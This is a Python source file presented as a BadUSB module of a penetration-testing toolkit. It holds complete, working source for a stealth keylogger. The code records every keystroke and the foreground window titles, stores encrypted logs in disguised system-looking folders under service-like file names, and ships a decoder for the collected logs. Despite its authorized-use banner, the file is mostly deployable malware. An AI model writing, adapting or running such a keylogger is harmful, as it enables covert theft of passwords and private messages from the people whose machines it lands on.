"""
╔══════════════════════════════════════════════════════════════╗
║         ERR0RS ULTIMATE — BadUSB Stealth Keylogger           ║
║              Module: badusb_keylogger.py                     ║
║         Author: Eros (Gary Holden Schneider)                 ║
║         Purpose: Authorized Penetration Testing ONLY         ║
╠══════════════════════════════════════════════════════════════╣
║  USE ONLY ON SYSTEMS YOU OWN OR HAVE WRITTEN AUTHORIZATION   ║
║  Unauthorized deployment is ILLEGAL under CFAA & equivalents ║
╚══════════════════════════════════════════════════════════════╝

FUNCTION OVERVIEW:
------------------
This module is designed for BadUSB (HID injection) scenarios.
When a BadUSB device (Rubber Ducky, Flipper Zero, Pico-W HID)
injects keystrokes to deploy a payload, this script:

1. Silently installs itself to a persistence location
2. Captures all keystrokes with metadata
3. Stores logs locally (encrypted, no network — client safety)
4. Supports exfil via USB collection on next engagement
5. Uses evasion techniques appropriate for authorized red team ops

BADUSB DEPLOYMENT FLOW:
-----------------------
[BadUSB Device inserted]
      ↓
[HID keyboard emulation]
      ↓
[Ducky Script / Flipper payload runs]
      ↓
[Opens PowerShell/bash, executes this script silently]
      ↓
[Keylogger installs to persistence location]
      ↓
[Runs in background, logs all keystrokes]
      ↓
[Pentester returns, retrieves USB, collects logs]
"""

import os
import sys
import platform
import threading
import time
import hashlib
import base64
import json
import argparse
from datetime import datetime
from pathlib import Path

try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False
    print("[!] pynput not available — install with: pip install pynput")
    sys.exit(1)

try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

CONFIG = {
    "log_dir": None,
    "log_filename": "svc_log.dat",
    "max_log_size_mb": 10,
    "encrypt_logs": CRYPTO_AVAILABLE,
    "encryption_key": None,
    "silent_mode": True,
    "capture_window_title": True,
    "log_timestamps": True,
    "log_special_keys": True,
    "install_persistence": False,
    "persistence_method": "autostart",
    "collection_marker": "ERRS_KL_",
}

class PlatformManager:
    def __init__(self):
        self.os = platform.system()
        self.log_dir = self._resolve_log_dir()
        self.script_path = Path(sys.argv[0]).resolve()

    def _resolve_log_dir(self):
        if CONFIG["log_dir"]:
            return Path(CONFIG["log_dir"])
        if self.os == "Windows":
            candidates = [
                Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows",
                Path(os.environ.get("LOCALAPPDATA", "")) / "Temp",
                Path(os.environ.get("TEMP", "C:\\Temp")),
            ]
        elif self.os in ("Linux", "Darwin"):
            candidates = [
                Path.home() / ".cache" / "fontconfig",
                Path.home() / ".local" / "share" / "recently-used",
                Path("/tmp") / ".X11-unix",
            ]
        else:
            candidates = [Path.home() / ".logs"]
        for path in candidates:
            try:
                path.mkdir(parents=True, exist_ok=True)
                test_file = path / ".write_test"
                test_file.touch()
                test_file.unlink()
                return path
            except (PermissionError, OSError):
                continue
        fallback = Path.home() / ".svc"
        fallback.mkdir(exist_ok=True)
        return fallback

    def get_log_path(self):
        return self.log_dir / (CONFIG["collection_marker"] + CONFIG["log_filename"])

    def get_key_path(self):
        return self.log_dir / ".svc_conf.bin"


class EncryptionManager:
    def __init__(self, key_path: Path):
        self.key_path = key_path
        self.key = self._load_or_generate_key()
        if CRYPTO_AVAILABLE:
            self.cipher = Fernet(self.key)

    def _load_or_generate_key(self) -> bytes:
        if self.key_path.exists():
            return self.key_path.read_bytes()
        if CRYPTO_AVAILABLE:
            key = Fernet.generate_key()
        else:
            raw = f"{platform.node()}{os.environ.get('USER', 'user')}ERR0RS"
            key = base64.urlsafe_b64encode(hashlib.sha256(raw.encode()).digest())
        self.key_path.write_bytes(key)
        if platform.system() in ("Linux", "Darwin"):
            os.chmod(self.key_path, 0o600)
        return key

    def encrypt(self, data: bytes) -> bytes:
        if CRYPTO_AVAILABLE and CONFIG["encrypt_logs"]:
            return self.cipher.encrypt(data)
        return data

    def decrypt(self, data: bytes) -> bytes:
        if CRYPTO_AVAILABLE and CONFIG["encrypt_logs"]:
            return self.cipher.decrypt(data)
        return data

    def get_key_b64(self) -> str:
        return base64.urlsafe_b64encode(self.key).decode()


class WindowMonitor:
    def __init__(self):
        self.os = platform.system()
        self._last_window = ""

    def get_active_window(self) -> str:
        try:
            if self.os == "Windows":
                import ctypes
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buf = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                return buf.value or "Unknown"
            elif self.os == "Linux":
                import subprocess
                result = subprocess.run(["xdotool", "getactivewindow", "getwindowname"],
                                        capture_output=True, text=True, timeout=1)
                return result.stdout.strip() or "Unknown"
            elif self.os == "Darwin":
                import subprocess
                script = 'tell application "System Events" to get name of first application process whose frontmost is true'
                result = subprocess.run(["osascript", "-e", script], capture_output=True, text=True, timeout=1)
                return result.stdout.strip() or "Unknown"
        except Exception:
            return "Unknown"

    def get_if_changed(self):
        current = self.get_active_window()
        if current != self._last_window:
            self._last_window = current
            return current
        return None


class LogManager:
    def __init__(self, platform_mgr: PlatformManager, enc_mgr: EncryptionManager):
        self.platform = platform_mgr
        self.enc = enc_mgr
        self.log_path = platform_mgr.get_log_path()
        self.buffer = []
        self.buffer_size = 50
        self.lock = threading.Lock()
        self._write_session_header()

    def _write_session_header(self):
        header = {
            "type": "SESSION_START",
            "timestamp": datetime.now().isoformat(),
            "hostname": platform.node(),
            "os": platform.system(),
            "user": os.environ.get("USERNAME") or os.environ.get("USER", "unknown"),
            "engagement_marker": "ERR0RS_BADUSB_KL_v1.0"
        }
        self._flush_to_disk([json.dumps(header)])

    def log(self, entry: dict):
        with self.lock:
            self.buffer.append(json.dumps(entry))
            if len(self.buffer) >= self.buffer_size:
                self._flush_to_disk(self.buffer)
                self.buffer = []

    def _flush_to_disk(self, entries: list):
        try:
            if self.log_path.exists():
                size_mb = self.log_path.stat().st_size / (1024 * 1024)
                if size_mb > CONFIG["max_log_size_mb"]:
                    self._rotate()
            raw = "\n".join(entries) + "\n"
            if CONFIG["encrypt_logs"] and CRYPTO_AVAILABLE:
                if self.log_path.exists():
                    existing = self.enc.decrypt(self.log_path.read_bytes()).decode()
                    combined = existing + raw
                else:
                    combined = raw
                self.log_path.write_bytes(self.enc.encrypt(combined.encode()))
            else:
                with open(self.log_path, "a", encoding="utf-8") as f:
                    f.write(raw)
                    f.flush()
        except Exception as e:
            if not CONFIG["silent_mode"]:
                print(f"[LogManager] Write error: {e}")

    def _rotate(self):
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        rotated = self.log_path.parent / f"{CONFIG['collection_marker']}archive_{ts}.dat"
        self.log_path.rename(rotated)

    def force_flush(self):
        with self.lock:
            if self.buffer:
                self._flush_to_disk(self.buffer)
                self.buffer = []
        footer = json.dumps({"type": "SESSION_END", "timestamp": datetime.now().isoformat()})
        self._flush_to_disk([footer])

class StealthKeylogger:
    def __init__(self):
        self.platform = PlatformManager()
        self.enc = EncryptionManager(self.platform.get_key_path())
        self.log_mgr = LogManager(self.platform, self.enc)
        self.window_mon = WindowMonitor() if CONFIG["capture_window_title"] else None
        self.active_modifiers = set()
        self.running = False

    def _format_key(self, key) -> str:
        if hasattr(key, 'char') and key.char:
            return key.char
        key_map = {
            keyboard.Key.space: " ", keyboard.Key.enter: "[ENTER]",
            keyboard.Key.tab: "[TAB]", keyboard.Key.backspace: "[BKSP]",
            keyboard.Key.delete: "[DEL]", keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.shift_r: "[SHIFT_R]", keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.ctrl_r: "[CTRL_R]", keyboard.Key.alt_l: "[ALT]",
            keyboard.Key.alt_r: "[ALT_R]", keyboard.Key.cmd: "[CMD]",
            keyboard.Key.esc: "[ESC]", keyboard.Key.caps_lock: "[CAPS]",
            keyboard.Key.up: "[UP]", keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]", keyboard.Key.right: "[RIGHT]",
            keyboard.Key.f1: "[F1]", keyboard.Key.f2: "[F2]",
            keyboard.Key.f3: "[F3]", keyboard.Key.f4: "[F4]",
            keyboard.Key.f5: "[F5]", keyboard.Key.f6: "[F6]",
            keyboard.Key.f7: "[F7]", keyboard.Key.f8: "[F8]",
            keyboard.Key.f9: "[F9]", keyboard.Key.f10: "[F10]",
            keyboard.Key.f11: "[F11]", keyboard.Key.f12: "[F12]",
        }
        return key_map.get(key, f"[{str(key).replace('Key.', '').upper()}]")

    def _is_modifier(self, key) -> bool:
        return key in {keyboard.Key.shift, keyboard.Key.shift_r,
                       keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
                       keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.cmd}

    def on_press(self, key):
        try:
            if self._is_modifier(key):
                self.active_modifiers.add(key)
                if not CONFIG["log_special_keys"]:
                    return
            formatted = self._format_key(key)
            entry = {"k": formatted}
            if CONFIG["log_timestamps"]:
                entry["t"] = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            if self.window_mon:
                window = self.window_mon.get_if_changed()
                if window:
                    self.log_mgr.log({"type": "WINDOW", "w": window, "t": datetime.now().strftime("%H:%M:%S")})
            if self.active_modifiers and not self._is_modifier(key):
                mod_str = "+".join([self._format_key(m).strip("[]") for m in self.active_modifiers])
                entry["k"] = f"[{mod_str}+{formatted.strip('[]')}]"
            self.log_mgr.log(entry)
        except Exception:
            pass

    def on_release(self, key):
        self.active_modifiers.discard(key)

    def start(self):
        self.running = True
        try:
            with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                listener.join()
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

    def start_background(self):
        self.running = True
        thread = threading.Thread(target=self.start, daemon=True)
        thread.start()
        return thread

    def stop(self):
        self.running = False
        self.log_mgr.force_flush()


class LogDecoder:
    def __init__(self, log_path: str, key_b64: str = None):
        self.log_path = Path(log_path)
        self.key_b64 = key_b64

    def decode(self) -> str:
        if not self.log_path.exists():
            return f"[!] Log file not found: {self.log_path}"
        raw = self.log_path.read_bytes()
        if self.key_b64 and CRYPTO_AVAILABLE:
            try:
                key = base64.urlsafe_b64decode(self.key_b64)
                fernet_key = base64.urlsafe_b64encode(key[:32])
                cipher = Fernet(fernet_key)
                raw = cipher.decrypt(raw)
            except Exception as e:
                return f"[!] Decryption failed: {e}"
        output = []
        for line in raw.decode("utf-8", errors="replace").strip().split("\n"):
            if not line.strip():
                continue
            try:
                entry = json.loads(line)
                if entry.get("type") == "SESSION_START":
                    output.append(f"\n{'='*60}\nSESSION: {entry.get('timestamp')}\nHost: {entry.get('hostname')} | User: {entry.get('user')}\n{'='*60}\n")
                elif entry.get("type") == "WINDOW":
                    output.append(f"\n\n[Window: {entry.get('w')}] @ {entry.get('t')}\n")
                elif "k" in entry:
                    output.append(entry["k"])
            except json.JSONDecodeError:
                output.append(line)
        return "".join(output)


def main():
    parser = argparse.ArgumentParser(description="ERR0RS BadUSB Keylogger")
    parser.add_argument("--silent", action="store_true")
    parser.add_argument("--decode", action="store_true")
    parser.add_argument("--log", type=str)
    parser.add_argument("--key", type=str)
    args = parser.parse_args()
    if args.silent:
        CONFIG["silent_mode"] = True
    if args.decode:
        if not args.log:
            print("[!] Provide --log path")
            return
        print(LogDecoder(args.log, args.key).decode())
        return
    StealthKeylogger().start()


if __name__ == "__main__":
    main()
